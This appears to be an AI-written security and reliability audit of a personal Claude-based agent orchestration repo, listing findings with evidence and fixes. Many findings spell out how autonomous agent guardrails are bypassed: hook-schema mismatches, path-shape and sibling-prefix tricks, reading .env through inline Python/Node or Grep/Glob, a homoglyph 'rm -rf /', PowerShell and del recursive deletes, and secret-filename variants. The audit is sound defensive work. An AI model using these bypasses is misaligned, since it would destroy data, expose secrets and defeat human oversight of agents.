# Codex Deep Audit - epdev/Jarvis

Date: 2026-04-09  
HEAD: `00f5a7e44c1aeb3477ae16e22bd609cbb92cc507`  
Wall time: ~4h  
Tests: `1 failed / 1169 passed / 1 collection crash class found`

Harnesses built:
- H1 fake `claude` CLI
- H2 synthetic `.env`
- H3 fake MCP stdio servers
- H4 fake HTTP sink server
- H5 synthetic memory/history/data trees
- H6 Windows simulation shim
- H7 hook invocation simulator
- H8 import-based dependency resolver

## TL;DR

- **CRITICAL**: Hooks are non-portable and fail hard (absolute `C:/Users/ericp/...` + `python` alias), so security/event hooks silently die in this runtime.
- **HIGH**: `tests/defensive/test_trust_topology.py` executes `sys.exit(0)` at import time; this crashes `pytest` collection and can hide regressions.
- **HIGH**: cp1252 crash is real in `voice_inbox_sync.py` due Unicode arrows in print paths; validated with runtime `UnicodeEncodeError`.
- **HIGH**: Steering anti-criterion risk persists: `verify_5e1_falsification.py` and `verify_5e2_falsification.py` return PASS with all checks skipped.
- **MEDIUM**: Bash guard misses a destructive Node variant (`node -e ... rmSync(...)`) in live fuzzing.

## Findings

### CRITICAL

- Hook command portability break - `.claude/settings.json` + hook runtime
  - Static: Hook commands are absolute to another machine and invoke bare `python`.
  - Dynamic evidence:
    - Command: `python _codex_scratch/invoke_hook.py --hook PreToolUse --payload _codex_scratch/payload_pretool_bash.json`
    - Output: each hook returns exit `9009` with `Python was not found...`.
  - Impact: PreToolUse/PostToolUse/Stop hooks are dead in this runtime, so validator and telemetry protections are bypassed operationally.
  - Fix: Replace hardcoded commands with repo-relative wrappers and explicit interpreter path resolution (`sys.executable` or `%~dp0` launcher). Remove user-specific absolute paths.

- Verification gate bypass by "all skipped = pass" - `tools/scripts/verify_5e1_falsification.py`, `tools/scripts/verify_5e2_falsification.py`
  - Static: both scripts print PASS even when all anti-criteria checks are skipped due absent follow-on evidence.
  - Dynamic evidence:
    - Command: `python _codex_scratch/.venv_audit/Scripts/python.exe tools/scripts/verify_5e1_falsification.py`
    - Output tail: `RESULT: PASSED (0 passed, 8 skipped/N/A)`
  - Impact: Forbidden state can exist while verifier reports healthy; this is exactly the "silent anti-criterion no-op" failure class.
  - Fix: hard-fail when required evidence is missing after warm-up window; `sys.exit(1)` on "all skipped" for maturity-gated verifiers.
  - Additional dynamic evidence (5E-2 I8 blind spot):
    - Sandbox probe seeded `2` synthetic run reports representing same-day follow-on emissions (throttle-violation shape), with `followon_state.json` count kept at `1`.
    - `verify_5e2_falsification.py` still reports `[PASS] I8 ... count=1` and overall `RESULT: PASSED`.
  - Additional dynamic evidence (5E-1 I6 timestamp bypass):
    - Sandbox probe seeded `2` follow-on tasks on same calendar day using timestamp-form `created` values (`2026-04-10T01:00:00Z`, `2026-04-10T02:00:00Z`).
    - `verify_5e1_falsification.py` reported `[PASS] I6 ... across 2 day(s), max 1/day` and overall `RESULT: PASSED`.
    - This proves grouping is by raw `created` string, not normalized calendar day.
  - Additional dynamic evidence (5E-2 I6 run-report blind spot):
    - Sandbox probe seeded a run report containing follow-on payload with `generation: 3`.
    - `verify_5e2_falsification.py` still reported `[SKIP] I6 ... No follow-on tasks emitted yet` and overall `RESULT: PASSED`.
    - This contradicts the check label ("in run reports") and shows run-report follow-ons are not evaluated.
  - Additional fix: implement I8 historical/day-level check from run reports as documented, not only `followon_state.json`.
  - Additional fix: normalize `created` to date before per-day counting in 5E-1 I6, and parse follow-on evidence from run reports in 5E-2 I6 before deciding SKIP/PASS.

- Validator payload-schema mismatch can nullify PreToolUse protection in hook path - `security/validators/validate_tool_use.py` + hook payload shape
  - Static:
    - `validate_tool_use.py` expects stdin shape `{ "tool": ..., "input": ... }`.
    - `hook_events.py` parses hook payload shape `{ "tool_name": ..., "tool_input": ... }` (same PreToolUse stream family).
    - `tests/test_hook_events.py` (passing suite) codifies `tool_name`/`tool_input` as the expected hook schema.
  - Dynamic evidence:
    - Direct validator call (autonomous + canonical shape):
      - payload `{tool:'Write', input:{file_path:'CLAUDE.md'}}` -> `{"decision":"block",...}` (correct)
    - Direct validator call (autonomous + hook-style shape):
      - payload `{tool_name:'Write', tool_input:{file_path:'CLAUDE.md'}}` -> `{"decision":"allow"}` (bypass)
    - Hook simulation:
      - `_codex_scratch/payload_pretool_hookshape_rmrf.json` with `tool_name:"Bash", tool_input.command:"rm -rf /"`
      - `invoke_hook.py --hook PreToolUse ...` returns validator decision `allow`.
  - Impact: if runtime PreToolUse payloads follow hook-style keys (which other hooks in this codebase already assume), validator can devolve into near-no-op allow behavior.
  - Fix: normalize both schemas in validator entrypoint (`tool_name->tool`, `tool_input->input`) before checks; add unit test for both payload shapes.
  - Additional consequence proven:
    - Overnight guard blocks canonical payload (`tool='Write', input.file_path='history/security/evil.md'`) but allows hook-style payload (`tool_name/tool_input`) under same env (`JARVIS_OVERNIGHT_DIMENSION='prompt_quality'`), nullifying dimension-scope enforcement when schema mismatches.
    - Secret read guard blocks canonical payload (`tool='Read', input.file_path='.env'`) but allows hook-style equivalent (`tool_name='Read', tool_input.file_path='.env'`).

- Protected-path regex guards are bypassable with path-shape variants - `security/validators/validate_tool_use.py`
  - Dynamic evidence (autonomous mode, overnight dimension unset):
    - Write guard allows protected targets when path form avoids regex suffix:
      - `memory/work/telos` -> allow
      - `orchestration/context_profiles` -> allow
      - `orchestration/producers.json/` -> allow
      - `CLAUDE.md/` -> allow
    - Secret-read guard allows extension/suffix variants:
      - `credentials.json/` -> allow
      - `secret.pem/` -> allow
      - `secret.key/` -> allow
  - Impact: autonomous guardrails can be sidestepped by path normalization quirks (trailing slash, directory-form, missing expected suffix shape).
  - Fix: normalize `file_path` to canonical path objects before matching and apply path-aware protected-root checks instead of raw regex on unnormalized strings.

- Autonomous worktree containment bypass via naive prefix check - `security/validators/validate_tool_use.py`
  - Static:
    - `_check_autonomous_file_containment()` uses `resolved.startswith(wt_resolved)` for path containment.
  - Dynamic evidence:
    - With `JARVIS_SESSION_TYPE=autonomous`, `JARVIS_WORKTREE_ROOT=C:\\Users\\Admin PC\\epdev`:
      - `Read C:/Users/Admin PC/epdev_evil/not_in_worktree.txt` -> `{"decision":"allow"}`
      - `Write C:/Users/Admin PC/epdev_shadow/out.txt` -> `{"decision":"allow"}`
      - `Read ../epdev_evil/outside.txt` (relative traversal) -> `{"decision":"allow"}`
      - Control check `Read C:/Windows/System32/drivers/etc/hosts` -> correctly blocked.
  - Impact: sibling paths sharing the same string prefix can escape the intended worktree containment boundary.
  - Fix: replace prefix string check with path-aware containment (`resolved_path.is_relative_to(wt_path)` or equivalent normalized ancestor check with path separators).
  - Additional dynamic evidence:
    - Non-Read tools have no autonomous containment enforcement:
      - `Grep path='C:/Users/Admin PC/epdev_evil'` -> allow
      - `Glob path='C:/Users/Admin PC/epdev_evil'` -> allow
      - `Grep path='../epdev_evil'` -> allow
      - `Glob path='../epdev_evil'` -> allow

- Secret-file protection is tool-siloed and bypassable via non-Read file tools - `security/validators/validate_tool_use.py`
  - Dynamic evidence (autonomous mode):
    - `Read .env` -> blocked (expected)
    - `Glob` query over env files -> allowed
    - `Grep` with `path='.env'` -> allowed
    - PreToolUse hook simulation with canonical `Glob` payload also returns validator decision `allow`.
    - PreToolUse hook simulation with canonical `Grep` payload targeting `.env` also returns validator decision `allow`.
    - Bash inline interpreters can read `.env` while validator allows:
      - `python -c "print(open('.env').read())"` -> allow
      - `node -e "console.log(require('fs').readFileSync('.env','utf8'))"` -> allow
      - direct shell forms (`rg . .env`, `type .env`, `more .env`) were blocked, highlighting inconsistent coverage.
  - Impact: autonomous sessions can still target secret files through other file-reading tools despite Read guard.
  - Fix: extend secret-path and containment checks to all file-addressing tools (`Glob`, `Grep`, and equivalents), not only Read/Write/Edit.

- **HIGH**: Autonomous containment is fail-open when `JARVIS_WORKTREE_ROOT` is unset
  - Dynamic evidence:
    - With `JARVIS_SESSION_TYPE=autonomous` and no `JARVIS_WORKTREE_ROOT`, validator allows `Write C:/Temp/outside-autonomous-write.txt`.
  - Impact: any autonomous entrypoint that forgets to set worktree root loses repo-boundary enforcement entirely.
  - Fix: fail closed for Write/Edit in autonomous mode when worktree root is absent, except explicitly allowlisted job types.

### HIGH

- Pytest collection crash via module-level exit - `tests/defensive/test_trust_topology.py`
  - Static: script-style execution at import-time includes `sys.exit(0)`.
  - Dynamic evidence:
    - Command: `pytest -xvs tests`
    - Output: `INTERNALERROR ... SystemExit: 0` (no tests run after crash point).
  - Impact: CI can fail unpredictably; regression suites can be masked by collection-time exits.
  - Fix: move script mode behind `if __name__ == "__main__":` and keep import-safe test functions only.

- Windows cp1252 print failure - `tools/scripts/voice_inbox_sync.py`
  - Static: non-ASCII arrows (`→`) are printed directly.
  - Dynamic evidence:
    - Command: `pytest -xvs tests --ignore=tests/defensive/test_trust_topology.py`
    - Failure: `UnicodeEncodeError: 'charmap' codec can't encode character '\u2192'` at `print(...)`.
  - Impact: script and test path crash on Windows consoles; violates explicit steering rule.
  - Fix: ASCII-only output in CLI prints (`->`) or sanitize text before print.

- Dispatcher self-test portability failures - `tools/scripts/jarvis_dispatcher.py`
  - Static: subprocess/git assumptions are environment-sensitive.
  - Dynamic evidence:
    - Command: `python tools/scripts/jarvis_dispatcher.py --test`
    - Output: multiple `FAIL: [WinError 2] The system cannot find the file specified` on selection/scope tests.
  - Impact: built-in regression harness for dispatcher is not trustworthy on constrained Windows shells.
  - Fix: resolve executable paths explicitly (git/python), add dependency preflight in self-test.

- Scheduler wrappers can fail hard yet report success exit codes - `tools/scripts/run_dispatcher.bat`, `tools/scripts/run_heartbeat.bat`, `tools/scripts/run_event_rotation.bat`
  - Dynamic evidence (sandbox host-path mismatch):
    - Each script prints `The system cannot find the path specified.`
    - Effective batch exit remains `0` (`EXITCODE:0`) for all three wrappers.
  - Impact: Windows Task Scheduler can record successful runs while the job never executed, masking outages and starving remediation.
  - Fix: enable fail-fast in wrappers (`setlocal EnableExtensions`, `if errorlevel 1 exit /b %errorlevel%` after critical steps), and propagate child process failures to final exit code.

- Anti-criterion verifier false-pass on malformed event entries - `tools/scripts/verify_backtest_cutoffs.py`
  - Dynamic evidence (sandbox forbidden-state probe):
    - Replaced `data/backtest_events.yaml` with only non-dict entries: `events: [bad, 123]`.
    - Verifier returned exit `0` and printed `PASS: all 2 backtest event cutoffs are before ...`.
  - Impact: leakage verifier can pass without validating any event object, allowing malformed/backfilled data to silently bypass ISC protection.
  - Fix: fail when any `events` element is non-dict (or when zero entries were actually validated).

- `verify_synthesis_routine.py` can false-pass on arbitrary markdown touched today - `tools/scripts/verify_synthesis_routine.py`
  - Dynamic evidence (sandbox forbidden-state probe):
    - Queued unprocessed signal (`memory/learning/signals/sig-false-pass.md`).
    - Created non-synthesis file `memory/learning/synthesis/README.md` touched today.
    - Verifier returned exit `0` with `PASS: synthesis doc created today`.
  - Impact: routine can report healthy without producing a real synthesis artifact; any markdown churn in synthesis directory satisfies gate.
  - Fix: validate synthesis filename/schema/frontmatter (not just `.md` mtime), and require signal-consumption evidence when signals are queued.

- Infrastructure execution errors are mis-routed as retryable ISC failures - `tools/scripts/jarvis_dispatcher.py`
  - Dynamic evidence:
    - Sandbox event log shows repeated failure payloads with infra error:
      - `dispatcher.task_failed` for `task-1775794229991160` with `failure_reason: "[WinError 2] The system cannot find the file specified"` and `task_status: "pending"`.
      - same pattern for `task-1775794230000953`.
    - This indicates non-ISC runtime faults entered retry queue instead of terminal infra-failure handling.
  - Static cause:
    - Failure typing currently does `ftype = "no_output" if commit_count == 0 and not report.get("failure_reason") else "isc_fail"`.
    - Any crash that *does* set `failure_reason` (e.g., exec/file-not-found) becomes `isc_fail` and can retry.
  - Impact: dispatcher can spend retries on deterministic infrastructure faults, creating noisy loops and delaying real task progress.
  - Fix: classify known infrastructure/runtime failures separately (e.g., `infra_error`) and route directly to `failed`/`manual_review` without retry.

- **HIGH**: Weekly-synthesis anti-criterion drift between routine template and active backlog rows
  - Dynamic evidence:
    - `orchestration/routines.json` `weekly-synthesis` template includes fidelity gate:
      - `Verify: python tools/scripts/verify_synthesis_recall.py`
    - Active `orchestration/task_backlog.jsonl` rows for `routine_id='weekly-synthesis'` use weaker criterion:
      - `Verify: grep -ril signal memory/learning/synthesis/ || echo no-synth-needed`
  - Impact: deployed routine tasks can pass with superficial string-match checks while bypassing the stronger hallucination/fidelity verifier.
  - Fix: when routines are injected/updated, enforce template-to-backlog ISC parity (or auto-refresh active routine rows) so strengthened anti-criteria cannot silently regress.

### MEDIUM

- Bash validator miss for destructive Node pattern - `security/validators/validate_tool_use.py`
  - Static: regex in `_inline_script_destructive` catches `rmSync` token but not minified/alternate forms robustly.
  - Dynamic evidence:
    - Fuzz case: `node -e "require('fs').rmSync('x',{recursive:true})"`
    - Result: `"decision": "allow"` in `_codex_scratch/validator_fuzz_results.json`.
  - Impact: destructive inline payload can slip through Bash path guard.
  - Fix: broaden Node inline detector for `fs.rmSync` variants and object-literal options.

- Security drift vs constitutional guidance (`git ls-files memory history data`)
  - Static: steering mentions no personal content tracking.
  - Dynamic evidence:
    - Command: `git ls-files memory history data`
    - Output: large tracked surface under `memory/`, `history/`, `data/`.
  - Impact: personal/runtime artifacts are versioned; increases leak and repo-noise risk.
  - Fix: split infra vs personal data, enforce excludes, and move mutable personal state to ignored roots.

- Wildcard MCP allow-list present - `.claude/settings.json`
  - Static: `mcp__tavily__*`.
  - Dynamic evidence:
    - Command: regex scan of settings.
    - Match confirmed.
  - Impact: wildcard policy can over-grant if server tool surface changes.
  - Fix: enumerate specific read-only tool names explicitly.

- Security scanner signal quality is noisy at default scope
  - Static: broad scans include test fixtures and generated code.
  - Dynamic evidence:
    - `bandit -r tools security tests` produced 2150 findings; high-value set is small (`B602` in `isc_executor.py`, `paradigm_health.py`).
  - Impact: high alert fatigue; real issues buried.
  - Fix: baseline and severity gating; scan targets by trust boundary and suppress known test-only classes.

- `verify_producer_health.py` can crash on schema drift in issue payloads
  - Dynamic evidence:
    - Monkeypatched `query_producer_health()` to return issue with `hours_ago` as string `"?"`.
    - Running verifier throws `ValueError: Unknown format code 'f' for object of type 'str'` at output formatting (`{hours:.1f}` path).
  - Impact: health verifier can crash (non-actionable exception) instead of deterministically reporting unhealthy producers when upstream payload is malformed.
  - Fix: coerce `hours_ago` defensively (`float(...)` with fallback) before formatting, or print raw value when numeric conversion fails.

### LOW

- God-file concentration
  - Dynamic evidence: `_codex_scratch/large_py_files.json` shows `jarvis_dispatcher.py` at 3399 lines plus multiple 800-1100 line modules.
  - Impact: review and change risk concentration.
  - Fix: carve out deterministic helpers (`retry`, `reporting`, `routing`, `verification`) into focused modules.

- Large blobs in history (>1MB)
  - Dynamic evidence: `_codex_scratch/large_blobs.json` found 4 blobs over 1MB in `memory/work/workbench-keynote/images/`.
  - Impact: clone and history bloat.
  - Fix: move binaries to artifact storage or LFS; keep metadata only in repo.

## Dynamic check results

- 4.1 tests:
  - `pytest -xvs tests` -> collection crash due `SystemExit` in trust topology file.
  - `pytest -xvs tests --ignore=...` -> `1169 passed, 1 failed` (`voice_inbox_sync` cp1252).
- 4.2 validator fuzzing:
  - 46 adversarial payloads, 37 blocked; key miss on Node destructive inline command.
- 4.3 anti-criterion exit checks:
  - All `verify_*.py` returned exit 0 in default data state; two falsification verifiers report PASS with all checks skipped.
- 4.4 Windows-clock simulation:
  - `backlog._generate_task_id()` stress (2k single + 2x2k parallel) -> zero collisions baseline and shim runs.
- 4.7 concurrent write stress:
  - `backlog_append` 4 writers x 500 -> 2000/2000 records, 0 duplicate IDs, 0 JSON corruption.
- 4.8 hook simulation:
  - H7 invocations show hook command runtime broken (`python` not found + hardcoded external paths).
- 4.11 analyzers:
  - `ruff`: 287 findings.
  - `pyflakes` (scoped): high volume, includes undefined name in dispatcher (`date`).
  - `mypy`: module mapping conflict (`isc_executor` duplicate package/module name).
  - `bandit`: high signal includes `shell=True` findings (`isc_executor.py`, `paradigm_health.py`).
  - `pip-audit`: no known vulns.
  - `semgrep`: static-only downgrade (Windows unsupported by package/runtime).
- 4.12 git hygiene:
  - `git fsck` clean.
  - 4 blobs >1MB in history.
  - single worktree only.

## What's GOOD

- Backlog ID generation appears collision-safe under heavy burst and multiprocess stress.
- `validate_tool_use.py` blocks most high-risk payload classes (rm-rf, force-push, secret echoes, traversal, autonomous write/read boundaries).
- `backlog_append` atomicity/locking held under 4x500 parallel append stress with no record corruption.
- `pip-audit` reported no known dependency CVEs in active environment.
- Existing tests cover many security/deterministic helpers deeply (large pass count once collection blocker is bypassed).
- `verify_backtest_cutoffs.py` correctly fails on intentionally forbidden post-cutoff event data (exit nonzero with explicit offending IDs).

## Meta-observations

- Portability debt is now a first-order risk class (absolute paths, shell assumptions, `python` alias dependence).
- Guardrail intent is strong, but verifier semantics still allow "green on no evidence" in some critical scripts.
- The system is over-concentrated in a handful of large orchestration files, increasing change blast radius.
- Tooling noise (linters/security scans) is high enough to hide true positives without scoped baselines.

## Harnesses built (reusable)

- `H1` fake Claude CLI:
  - `_codex_scratch/bin/claude` + `_codex_scratch/bin/claude.cmd`
  - Modes via `FAKE_CLAUDE_MODE={success,rate_limit,network_error,malformed,empty}`
  - Logs to `_codex_scratch/claude_calls.jsonl`
- `H2` synthetic env:
  - `_codex_scratch/.env`
  - Detected vars manifest: `_codex_scratch/env_vars_detected.json`
- `H3` fake MCP servers:
  - `_codex_scratch/mcp_fakes/*_server.py`
  - Generic protocol shim: `_codex_scratch/mcp_fakes/mcp_fake_server.py`
- `H4` fake HTTP sink:
  - `_codex_scratch/fake_http_server.py` (running on `127.0.0.1:8765`)
  - Logs to `_codex_scratch/http_calls.jsonl`
- `H5` synthetic trees:
  - `_codex_scratch/fake_memory`, `_codex_scratch/fake_history`, `_codex_scratch/fake_data`
- `H6` Windows simulator:
  - `_codex_scratch/windows_shim.py`
- `H7` hook simulator:
  - `_codex_scratch/invoke_hook.py`
- `H8` dependency resolver:
  - `_codex_scratch/resolve_deps.py`
- Bootstrap:
  - `_codex_scratch/harness_setup.py`
  - Run: `python _codex_scratch/harness_setup.py`

## Command log (high-value)

- Clone + bootstrap:
  - `git clone ...`
  - `python -m venv _codex_scratch/.venv_audit`
  - `python _codex_scratch/harness_setup.py`
- Core runtime:
  - `pytest -xvs tests`
  - `pytest -xvs tests --ignore=tests/defensive/test_trust_topology.py`
  - `python _codex_scratch/fuzz_validators.py`
  - `python _codex_scratch/run_selftests.py`
  - `python tools/scripts/jarvis_dispatcher.py --test`
  - `python tools/scripts/overnight_runner.py --test`
  - `python _codex_scratch/id_collision_stress.py`
  - `python _codex_scratch/backlog_concurrency_stress.py`
- Analysis:
  - `ruff check .`
  - `pyflakes tools security tests orchestration`
  - `mypy --ignore-missing-imports tools security tests`
  - `bandit -r tools security tests -f json`
  - `pip_audit`
  - `vulture tools security orchestration`
  - `git fsck`, `git ls-files memory history data`

## Anything flagged STATIC-ONLY

- `semgrep --config=auto .`:
  - Reason: semgrep package/runtime does not support this Windows environment (install/build fails with explicit unsupported-platform error).
- Full routines-engine + dispatcher true end-to-end against production paths:
  - Reason: dispatcher path constants target tracked production files; strict audit constraint prohibited mutating tracked tree. Used self-test + isolated backlog stress harness instead.
- Schema drift full writer-reader key diff across all JSON/JSONL contracts:
  - Reason: requires broad runtime path rewiring in scripts that hardcode repo roots; partial checks completed, full automated matrix not completed within harness budget.

## Deep-run continuation addendum

### New findings from continuation pass

- **HIGH**: Dispatcher can spin indefinitely on inline tasks when repo root is dirty - `tools/scripts/jarvis_dispatcher.py`
  - Dynamic evidence:
    - Command: `python tools/scripts/jarvis_dispatcher.py` (sandbox clone, fake claude mode)
    - Observed: repeated reselection of same task (`Run prediction weekly review...`) for >350 iterations with `INLINE SETUP REFUSED: REPO_ROOT working tree dirty -- inline requires clean tree` and no terminal state transition; process manually killed after ~133s.
  - Impact: dispatcher loop can stall progress and burn runtime indefinitely instead of failing/parking the task.
  - Fix: when inline setup is refused, move task to `manual_review` or `failed` with explicit reason; never leave as `pending` for immediate reselection.

- **HIGH**: Routine injection is skipped entirely when backlog is empty - `tools/scripts/jarvis_dispatcher.py`
  - Dynamic evidence:
    - Sandbox with due routine configured and empty `orchestration/task_backlog.jsonl`.
    - Dispatcher output: `No tasks in backlog. Idle Is Success.` (no routine injection attempt)
    - Backlog remains 0 lines after run.
  - Impact: scheduler can dead-idle forever when backlog drains, even if routines are due.
  - Fix: run `inject_routines()` before empty-backlog early return (or remove early return and let main loop handle post-injection state).

- **HIGH**: `deliverable_exists()` can auto-close tasks from ISC text alone (false "already done") - `tools/scripts/jarvis_dispatcher.py`
  - Dynamic evidence:
    - Isolated sandbox task with ISC `Backlog remains valid jsonl | Verify: test -f orchestration/task_backlog.jsonl`
    - Dispatcher output: `Skipping task-roundtrip-isolated-2: deliverable already exists` then marks task `done`.
    - Root cause in code path: `deliverable_exists()` regex scans ISC for `test -f <path>` and treats existing target as pre-existing deliverable.
  - Impact: tasks can be silently auto-closed before execution just because their verifier references an existing file.
  - Fix: remove ISC-text regex from deliverable detection; only use explicit `expected_outputs`/artifact keys declared in task schema.

- **HIGH**: Existing branch name collision can silently auto-close unrelated pending task - `tools/scripts/jarvis_dispatcher.py`
  - Dynamic evidence:
    - Created branch `jarvis/auto-deliverable-collision-test`.
    - Added pending task with `id='deliverable-collision-test'` and unrelated ISC/outputs.
    - Dispatcher dry-run output: `Skipping deliverable-collision-test: deliverable already exists`.
    - Task state after run: `status='done'`, `notes='Auto-closed: deliverable pre-exists'`.
  - Impact: stale/colliding branch names can force false completion without worker execution.
  - Fix: bind deliverable checks to explicit artifact evidence, not branch-name existence alone; at minimum require matching run_report/commit metadata.

- **MEDIUM**: Dispatcher can fail task after ISC passes, with opaque `[WinError 2]` reason - `tools/scripts/jarvis_dispatcher.py`
  - Dynamic evidence:
    - Isolated task (`task-roundtrip-isolated-3`) with ISC `ls orchestration`:
      - Dispatcher: `ISC: 1/1 passed`
      - Immediately after: `Task ... FAILED (isc_fail): [WinError 2] The system cannot find the file specified`
      - Run report: `data/dispatcher_runs/task-roundtrip-isolated-3_20260410_002119.json`
  - Impact: task lifecycle semantics are inconsistent (all verifiers pass but terminal state is failed), making retry/triage logic noisy.
  - Fix: separate execution failure stage from ISC stage in status labeling and include failing subprocess command in `failure_reason`.

- **MEDIUM**: Windows subprocess launch path assumes `claude` is directly executable; `.cmd` shims fail under list-form invocation
  - Dynamic evidence:
    - In this environment, `shutil.which('claude')` resolves to `...\\_codex_scratch\\bin\\claude.CMD`.
    - `subprocess.run(['claude','-p','test'])` raises `FileNotFoundError [WinError 2]`.
    - Dispatcher worker then records `[WinError 2]` as worker failure even when ISC checks pass.
  - Impact: installs/distributions where Claude is exposed as `.cmd` (or wrapper script) can hard-fail worker execution paths.
  - Fix: resolve executable with `shutil.which` and normalize to invocable command (`cmd /c` fallback for `.cmd`), or prefer explicit `.exe` path when present.

- **HIGH**: Exit-0 rate-limit strings are still treated as success in some claude consumers - `tools/scripts/morning_feed.py`, `tools/scripts/self_diagnose_wrapper.py`
  - Dynamic evidence:
    - Harness: `_codex_scratch/rate_limit_probe.py` monkey-patched `subprocess.run` to return `returncode=0` and stdout `"You've hit your limit. Please wait."`
    - Results (`_codex_scratch/rate_limit_probe_results.json`):
      - `prediction_event_generator.run_claude` -> `None` (correct fail)
      - `prediction_backtest_producer.run_claude` -> `None` (correct fail)
      - `finance_recap.run_analysis` -> `None` (correct fail)
      - `jarvis_autoresearch.call_claude` -> explicit rate-limited marker (correct fail)
      - `morning_feed.call_claude` -> raw limit string returned as success (incorrect)
      - `self_diagnose_wrapper.call_claude_diagnose` -> raw limit string returned as diagnosis (incorrect)
      - `slack_poller._run_jarvis` -> raw limit string returned as absorb output (incorrect)
  - Impact: automation can consume rate-limit text as if it were real model output and make bad downstream decisions.
  - Fix: add shared `is_rate_limit_text()` guard and reject these strings in **all** claude wrappers before returning success.

- **MEDIUM**: Concurrent event logging drops records under load - `tools/scripts/hook_events.py`
  - Dynamic evidence:
    - Harness: `_codex_scratch/sandbox_repo/_codex_scratch/hook_events_stress.py`
    - Run 1: expected +1000 lines, observed +999 (`lost_lines: 1`), `bad_json_lines: 0`
    - Run 2 (schema-corrected payload): expected +1000 lines, observed +995 (`lost_lines: 5`), `bad_json_lines: 0`
  - Impact: JSONL remains parseable, but event loss breaks audit completeness under bursty hook traffic.
  - Fix: use append lock (file lock/mutex) for hook event writes or a single-writer queue.
  - Corroborating control:
    - `hook_session_cost.py` concurrent stress (`4x250`) showed `lost_lines: 0`, `bad_json_lines: 0` using its lock path.
    - This strengthens that missing lock discipline in `hook_events.py` is the differentiator.

- **MEDIUM**: Malformed hook input is silently recorded as successful PostToolUse event - `tools/scripts/hook_events.py`
  - Dynamic evidence:
    - Harness: `_codex_scratch/sandbox_repo/_codex_scratch/hook_events_malformed_probe.py`
    - Sent malformed stdin (`"{"`) to `hook_events.py`
    - Hook exit: `0`
    - Recorded event:
      - `hook: PostToolUse`
      - `tool: ""`
      - `success: true`
      - `session_id: ""`
  - Impact: invalid hook payloads can inflate “healthy” telemetry with fake success records and hide data-quality failures.
  - Fix: on JSON parse failure, emit explicit error event (`success: false`, `parse_error`) or exit nonzero without writing a success-shaped record.

- **LOW**: `hook_session_cost.py` also fail-opens on malformed JSON input
  - Dynamic evidence:
    - Malformed stdin (`"{"`) returns exit `0` and still appends a `session_cost` record with empty `session_id`.
  - Impact: cost/session telemetry can accumulate synthetic records disconnected from real sessions.
  - Fix: on parse failure, emit an explicit error-tagged row or reject write (nonzero exit) to preserve telemetry integrity.

- **LOW**: `vitals_collector` session totals can be inflated by malformed/empty session_cost rows - `tools/scripts/vitals_collector.py`
  - Dynamic evidence:
    - Sample output showed `events_today: 1002` with only `unique_sessions: 5`.
    - Collector increments totals for every `type='session_cost'` row even when `session_id` is empty.
    - `hook_session_cost.py` malformed-input path emits exactly such empty-session rows.
  - Impact: session activity metrics can overstate actual autonomous/session usage.
  - Fix: require non-empty `session_id` for session counters, or track separate `invalid_session_cost_rows` metric.

- **MEDIUM**: Validator bypasses remain for Unicode/shell variants - `security/validators/validate_tool_use.py`
  - Dynamic evidence:
    - Harness: `_codex_scratch/validator_fuzz_extra.py` with 10 adversarial Bash payloads -> `6 blocked / 4 allowed` (`_codex_scratch/validator_fuzz_extra_results.json`)
    - Allowed destructive variants:
      - homoglyph command token: `rｍ -rf /`
      - Node recursive delete variant: `node -e "fs=require('fs');fs.rmSync(..., {recursive:true,force:true})"`
      - PowerShell recursive delete: `Remove-Item -Recurse -Force C:\*`
      - heredoc inline python launcher: `python - <<'PY' ...`
  - Impact: policy intent is strong but attackers can evade via token normalization gaps and shell variant coverage gaps.
  - Fix: normalize Unicode (`NFKC`) before pattern checks, expand destructive command signatures for PowerShell/Node, and block heredoc inline interpreters consistently.
  - Additional deep-run payloads (`_codex_scratch/validator_fuzz_extra2_results.json`):
    - allowed: `del /s /q C:\\Windows\\Temp\\*`
    - allowed: `powershell -Command "Remove-Item -Path . -Recurse -Force"`

- **MEDIUM**: `slack_poller` invokes Claude with `--dangerously-skip-permissions` - `tools/scripts/slack_poller.py`
  - Dynamic evidence:
    - Captured invocation args from `_run_jarvis(...)`: `["claude","-p","--dangerously-skip-permissions", ...]`.
  - Impact: absorb flow runs with bypassed permission gating, increasing blast radius if prompt/input parsing is compromised.
  - Fix: remove `--dangerously-skip-permissions`; rely on standard permission + validator hook path.

- **MEDIUM**: Autonomous secret-read guard misses common secret filename variants - `security/validators/validate_tool_use.py`
  - Dynamic evidence (autonomous mode, `tool=Read`):
    - Allowed: `.env.local`, `.env.production`, `config/.env.dev`
    - Allowed: `credentials_backup.txt`, `my_secret.key.bak`, `prod-private.key.old`, `tokens.secret.txt`
  - Impact: autonomous workers can read common secret-bearing files that are slight variants of blocked suffixes.
  - Fix: broaden secret path patterns (e.g., `.env*`, `*credential*`, `*secret*`, key/pem anywhere in basename) and apply normalized basename checks.

- **HIGH**: `validate_context_files()` has secret/path-shape bypasses that keep toxic tasks selectable - `tools/scripts/jarvis_dispatcher.py`
  - Dynamic evidence:
    - Direct validator probe (`validate_context_files`) results:
      - blocked: `.env`, `foo/credentials.json`, `secrets/private.pem`
      - allowed (bypass): `.env.local`, `foo/credentials.json/`, `secrets/private.pem/`
      - allowed (containment bypass): `C:/Users/Admin PC/epdev_evil/x.txt`, `../epdev_evil/y.txt`
    - Selection-impact probe:
      - backlog with pending tasks using bypassed `context_files` (`.env.local`, sibling absolute/relative paths)
      - `select_next_task()` returns one of these tasks as eligible (`selected_task_id: "ctx-env-local"`).
    - Prompt-exposure probe:
      - with synthetic `.env.local` (`API_KEY=sk-FAKE-CONTEXT-LEAK`) and sibling file `../epdev_evil/y.txt`,
      - `generate_worker_prompt()` includes both file paths and raw contents in `CONTEXT FILES` block.
  - Impact: sensitive/out-of-scope files can enter worker context despite selection guards, creating data-exposure and boundary-violation risk before tool validators run.
  - Fix: canonicalize paths and apply strict containment + secret basename rules in `validate_context_files()` (including `.env*`, trailing-slash normalization, and path-aware `is_relative_to` checks).

- **LOW**: Secret scanner misses modern OpenAI key variant `sk-proj-...` - `security/validators/secret_scanner.py`
  - Dynamic evidence:
    - `line_has_secret('sk-abcdefghijklmnopqrstuvwxyz123456')` -> detected
    - `line_has_secret('sk-proj-abcdefghijklmnopqrstuvwxyz123456')` -> not detected
  - Impact: newer key prefixes can evade secret-pattern command/output checks.
  - Fix: expand `sk-` regex to include known sub-prefix variants (`sk-proj-`, etc.) and keep pattern list versioned.

- **MEDIUM**: Backlog schema drift is accumulating in persisted rows - `orchestration/task_backlog.jsonl` + `tools/scripts/lib/backlog.py`
  - Dynamic evidence:
    - Command: validate all backlog rows with `validate_task(...)`
    - Result: `72` rows scanned, `21` invalid, `24` distinct keysets.
